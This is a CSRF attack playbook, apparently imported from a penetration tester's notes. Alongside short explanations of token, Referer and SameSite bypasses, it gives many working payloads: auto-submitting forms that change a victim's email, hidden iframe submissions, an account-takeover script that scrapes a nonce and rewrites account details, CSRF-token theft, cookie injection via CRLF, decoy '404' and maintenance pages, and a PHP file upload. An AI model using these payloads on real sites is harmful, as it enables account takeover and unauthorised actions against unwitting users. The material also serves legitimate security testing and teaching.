---
technique: "CSRF"
family: "client-side"
severity_hint: "medium"
tags: ["CSRF", "HTTP", "Account Takeover", "HTML"]
source: "_raw/Web attacks/Web Attacks/CSRF.md"
source_sha256: "522dd61e87a4de68d6ef7a4bd115789c1c0db880ba77e5c34fae573f4519ce99"
curator_version: 2
review_status: imported-unreviewed
---

# CSRF

> Family: **client-side** · Severity hint: **medium** · Tags: CSRF, HTTP, Account Takeover, HTML
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `html: <html>`
- `html: <form method="POST"...> --> <form method="GET"...>`
- `html: ...`
- `html: <!DOCTYPE html>`
- `html: ...`
- `html: ...`
- `html: <!DOCTYPE html>`
- `html: <html>`
- `POST /email/change HTTP/1.1`
- `POST /email/change HTTP/1.1`
- `<script>`
- `<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">`
- `window.onclick = () => {`
- `<meta name="referrer" content="never">`
- `<html>`
- `jsx: fetch('https://example.com/edit-account/').then(response => response.text()).then(html => `
- `html: <img src="http://google.es?param=VALUE" style="display:none" />`
- `html: <iframe src="..."></iframe>`
- `html: <html>`
- `html: <!--`
- `html: <script>`
- `html: myFormData = new FormData();`
- `html: // https://www.exploit-db.com/exploits/20009`
- `html: <--! expl.html -->`
- `jsx: function submitFormWithTokenJS(token) {`
- `jsx: <form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/f`

## Playbook (operator notes)

# CSRF

[https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)

[https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

# Requirements

- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password)
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password

Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication

# Basic Payload

```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Testing CSRF

[CSRF Exploitation](https://app.notion.com/p/CSRF-Exploitation-827171f120ae4513a69091837c48b080?pvs=21) 

### **Base Steps**

1. Select a request anywhere in Burp Suite Professional that you want to test or exploit
2. From the right-click context menu, select Engagement tools / Generate CSRF PoC
3. Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser)
4. You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests
5. Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs

### **Change the request method `POST` → `GET`**

Test Case: Validation of CSRF token depends on request method

```html
<form method="POST"...> --> <form method="GET"...>
```

### **Remove CSRF token**

Test Case: Validation of CSRF token depends on token being present

Applications might implement a mechanism to **validate tokens** when they are present. However, a vulnerability arises if the validation is skipped altogether when the token is absent. Attackers can exploit this by **removing the parameter** that carries the token, not just its value. This allows them to circumvent the validation process and conduct a Cross-Site Request Forgery (CSRF) attack effectively.

### **Feed your own account generated CSRF token in attack**

1. Interact with functionality and intercept the request
2. Right click generate CSRF PoC
3. Copy the code in a `.html` file and remove any session tokens
4. Drop the request
5. Send the `html` file to the victim

```html
...
	<form method="POST" action="https://example.com/email/change-email">
		<input type="text" name="email" value="example@gmail.com">
		<input type="text" name="csrf" value="NqdmYFyfHgQl8JWLKd7YTOC24Tqdedpw">
	</form>
...
```

### **Chain any other vulnerability to add your cookie**

Test Case 1: CSRF Token Linked to Non-Session Cookie ****

1. Identify a vulnerability that allows injecting data into the victim's cookie
2. Verify if the CSRF token is tied to the session ID by changing the session ID while keeping everything else constant
3. Test if your CSRF token remains valid when used in the victim's request
4. Attempt to inject a Carriage Return Line Feed (CRLF) to alter the CSRF cookie's value
    1. Or use any other bug like XSS 
5. Create and send a proof of concept (PoC) with an XSS payload that executes a CRLF injection to the victim.

```html
<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
<body>
	<form method="POST" action="https://example.com/my-account/change-email">
		<input type="text" name="csrfKey" value="ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9">
		<input type="text" name="email" value="example@gmail.com">
		<input type="text" name="csrf" value="6EU5SJ9YKzfOsq9rNgDR8toGy0TKSw81">
		<input type="submit" value="Send">
	</form>
	<img src="http://example.com/?search=test%0d%0aSet-Cookie:%20csrfKey=ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9" onerror="document.forms[0].submit()">
</body>
</html>
```

### **Delete the Referrer Header Completely or suppress it**

Test Case: CSRF where Referrer validation depends on header being present

1. Intercept the request and try changing referrer to some other domain
2. If that didn't work, try to suppress the referrer header
3. you can use any of these or other techniques
    1. `<meta name="referrer" content="no-referrer">` 
    2. `<meta name="referrer" content="never">`

```html
...
<form method="POST" action="https://example.com/my-account/change-email">
		<input type="text" name="session" value="S4dyJbRWg1IqEpZlPkhICE5vJQhnv6ve">
		<input type="text" name="email" value="example@gmail.com">
		<meta name="referrer" content="no-referrer">
</form>
...
```

### **Try [attacker.com](http://attacker.com/) or similar payloads in the referrer header**

Test case: CSRF with broken Referrer validation

1. Intercept the request and try changing referrer to some other domain 
2. Generate a normal POC and include JavaScript in the script block to alter the URL and referrer

```html
...
<form method="POST" action="https://example.com/my-account/change-email">
		<input type="text" name="session" value="S4dyJbRWg1IqEpZlPkhICE5vJQhnv6ve">
		<input type="text" name="email" value="example@gmail.com">
		<meta name="referrer" content="no-referrer">
</form>
<script>
			history.pushState("", "", "/?ac761f621f79d75680e4054c00160033.web-security-academy.net")
      document.forms[0].submit();
</script>
...
```

### **Send `null` value in CSRF token**

Test Case: Validation of CSRF token depends on token value being present

1. Interact with functionality and intercept the request
2. Send this request to repeater
3. Add null CSRF param and generate PoC

```html
<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
<body>
	<form method="POST" action="https:example.com/email/change-email">
		<input type="text" name="email" value="example@gmail.com">
	</form>
<script>
      document.forms[0].submit();
    </script>
</body>
</html>
```

### **Method bypass**

If the request is using a "**weird**" **method**, check if the **method** **override functionality** is working. For example, if it's **using a PUT** method you can try to **use a POST** method and **send**: *https://example.com/my/dear/api/val/num?**_method=PUT***

This could also works sending the **_method parameter inside the a POST request** or using the **headers**:

- *X-HTTP-Method*
- *X-HTTP-Method-Override*
- *X-Method-Override*

### **Custom header token bypass**

If the request is adding a **custom header** with a **token** to the request as **CSRF protection method**, then:

- Test the request without the **Customized Token and also header**
- Test the request with exact **same length but different token**

### Content-Type change

According to [**this**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), in order to **avoid preflight** requests using **POST** method these are the allowed Content-Type values:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

However, note that the **severs logic may vary** depending on the **Content-Type** used so you should try the values mentioned and others like **`application/json`*,*`text/xml`**, **`application/xml`***.*

Example (from [here](https://brycec.me/posts/corctf_2021_challenges)) of sending JSON data as text/plain:

```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>
```

### **CSRF token is tied to a non-session cookie**

- In a variation on the preceding vulnerability, some applications do
tie the CSRF token to a cookie, but not to the same cookie that is used
to track sessions
- This can easily occur when an application employs two different
frameworks, one for session handling and one for CSRF protection, which
are not integrated together
- This situation is harder to exploit but is still vulnerable
- If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible
- The attacker can log in to the application using their own account,
obtain a valid token and associated cookie, leverage the cookie-setting
behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

**Note** The cookie-setting behavior does not even need to exist within the same web application as the [CSRF vulnerability](https://portswigger.net/web-security/csrf). Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.

### **CSRF token is simply duplicated in a cookie**

- Some applications do not maintain any server-side record of tokens
that have been issued, but instead duplicate each token within a cookie
and a request parameter
- When the subsequent request is validated, the application simply
verifies that the token submitted in the request parameter matches the
value submitted in the cookie
- This is sometimes called the "double submit" defense against CSRF,
and is advocated because it is simple to implement and avoids the need
for any server-side state

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

<aside>
⚠️

**Note** In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie  setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required  format, if that is being checked), leverage the cookie-setting behavior  to place their cookie into the victim's browser, and feed their token  to the victim in their CSRF attack.

</aside>

### Bypassing Pre-flight Requests for JSON Data

To send JSON data via POST, `Content-Type: application/json` in HTML form or `XMLHttpRequest` isn't easy. However, these methods might work:

1. **Alternative Content Types**: Use `Content-Type: text/plain` or `Content-Type: application/x-www-form-urlencoded` to test if backend processes data irrespective of Content-Type
2. **Modify Content Type**: Send data as `Content-Type: text/plain; application/json` to avoid preflight request and test if server accepts `application/json`
3. **SWF Flash File**: Use an SWF flash file to bypass restrictions. Learn more [here](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)

### Regex bypass

[URL Format Bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)

## **Bypassing SameSite Lax restrictions using GET requests**

- In practice, servers aren't always fussy about whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission
- If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a [CSRF attack](https://portswigger.net/web-security/csrf) by eliciting a `GET` request from the victim's browser
- As long as the request involves a top-level navigation, the browser will still include the victim's session cookie

```
<script> 
document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

- Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line
- For example, **Symfony supports the `_method` parameter in forms**, which takes precedence over the normal method for routing purposes
- Other frameworks support a variety of similar parameters

```
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
	<input type="hidden" name="_method" value="GET">
	<input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000">
</form>
```

## **Bypassing SameSite restrictions using on-site gadgets**

- If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests
- You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site
- One possible gadget is a client-side redirect that dynamically
constructs the redirection target using attacker-controllable input like URL parameters
- As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an
ordinary, standalone request
- Most importantly, this is a same-site request and, as such, will
include all cookies related to the site, regardless of any restrictions
that are in place
- If you can manipulate this gadget to elicit a malicious secondary
request, this can enable you to bypass any SameSite cookie restrictions
completely

## **Bypassing SameSite restrictions via vulnerable sibling domains**

In addition to classic CSRF, don't forget that if the target website supports [WebSockets](https://portswigger.net/web-security/websockets), this functionality might be vulnerable to [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)), which is essentially just a [CSRF attack](https://portswigger.net/web-security/csrf) targeting a WebSocket handshake

## **Bypassing SameSite Lax restrictions with newly issued cookies**

- Cookies with `Lax` SameSite restrictions aren't normally sent in any cross-site `POST` requests, but there are some exceptions
- As mentioned earlier, if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default
- However, to avoid breaking single sign-on (SSO) mechanisms, it
doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests
- As a result, there is a two-minute window in which users may be susceptible to cross-site attacks

**Note** This two-minute window does not apply to cookies that were explicitly set with the `SameSite=Lax` attribute.

- It's somewhat impractical to try timing the attack to fall within this short window
- On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can
preemptively refresh their cookie before following up with the main
attack
- For example, completing an OAuth-based login flow may result in a
new session each time as the OAuth service doesn't necessarily know
whether the user is still logged in to the target site
- To trigger the cookie refresh without the victim having to manually
log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current [OAuth](https://portswigger.net/web-security/oauth) session are included
- This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack
- Alternatively, you can trigger the cookie refresh from a new tab so
the browser doesn't leave the page before you're able to deliver the
final attack
- A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction
- E.g this will be blocked `window.open('https://vulnerable-website.com/login/sso');`
- To get around we can wrap it in an `onclick` event

```
window.onclick = () => {
	window.open('https://vulnerable-website.com/login/sso');
}
```

## **Bypassing Referer-based CSRF defenses**

Aside from defenses that employ CSRF tokens, some applications make use of the HTTP `Referer` header
 to attempt to defend against CSRF attacks, normally by verifying that 
the request originated from the application's own domain. This approach 
is generally less effective and is often subject to bypasses.

The HTTP **Referer header** (which is 
inadvertently misspelled in the HTTP specification) is an optional 
request header that contains the URL of the web page that linked to the 
resource that is being requested. It is generally added automatically by
 browsers when a user triggers an HTTP request, including by clicking a 
link or submitting a form. Various methods exist that allow the linking 
page to withhold or modify the value of the `Referer` header. This is often done for privacy reasons.

**Validation of Referer depends on header being present**

- Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted
- In this situation, an attacker can craft their [CSRF exploit](https://portswigger.net/web-security/csrf) in a way that causes the victim user's browser to drop the `Referer` header in the resulting request
- There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the [CSRF attack](https://portswigger.net/web-security/csrf)

```
<meta name="referrer" content="never">
```

## **Validation of Referer can be circumvented**

- Some applications validate the `Referer` header in a naive way that can be bypassed
- For example, if the application validates that the domain in the `Referer` starts with the expected value, then the attacker can place this as a subdomain of their own domain
- `[http://vulnerable-website.com.attacker-website.com/csrf-attack](http://vulnerable-website.com.attacker-website.com/csrf-attack)
- Likewise, if the application simply validates that the `Referer` contains its own domain name, then the attacker can place the required value elsewhere in the URL
- `http://attacker-website.com/csrf-attack?vulnerable-website.com`

```
<html>
    <body>
        <script>history.pushState('','','/?vuln.website.net/my-account')</script>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://vuln.website.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

<aside>
⚠️

**Note** Note Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the Referer header by default. You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that Referrer is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.

</aside>

# Exploit Examples

### Exfiltrating CSRF Token

If a **CSRF token** is being used as **defense** you could try to **ex-filtrate it** abusing a XSS vulnerability or a Dangling Markup  vulnerability

### Used in the wild

- ATO via E-Mail change

```jsx
fetch('https://example.com/edit-account/').then(response => response.text()).then(html => { 
    // Fetch the nonce from /edit-account/
		var parser = new DOMParser(); 
    var doc = parser.parseFromString(html, 'text/html');
    var nonce = doc.getElementById('save-account-details-nonce').value;
    console.log(nonce);
    
		// Change E-Mail (kind of a CSRF)
    fetch('https://example.com/edit-account/', { 
        method: 'POST',
        credentials: 'include', // Include Cookies
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `account_first_name=PWNED&account_last_name=PWNED&account_display_name=PWNED&account_email=PWNED@gmail.com&password_current=&password_1=&password_2=&save-account-details-nonce=${nonce}...`
    })
.then(response => {
        if (response.ok) { console.log("Done!"); } 
				else {console.log("Something went wrong..");}});});
```

### GET using HTML tags

```html
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

Other HTML5 tags that can be used to automatically send a GET request are:

```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
  body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```

### Form GET | POST request

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET | POST" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Form POST request through iFrame

```html
<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Ajax POST request

```html
<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```

### multipart/form-data POST request

```html
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
```

### multipart/form-data POST request v2

```html
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```

### Form POST request from within an iframe

```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"></iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```

### Steal CSRF Token and send a POST request

```jsx
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```

### Steal CSRF Token and send a Post request using an iframe, a form and Ajax

```jsx
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```

---

[CSRF (Cross Site Request Forgery)](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)

[Bypassing CSRF token validation | Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-token-validation)

[CSRF](https://kathan19.gitbook.io/howtohunt/csrf/csrf)

## Source
Original note: `_raw/Web attacks/Web Attacks/CSRF.md`
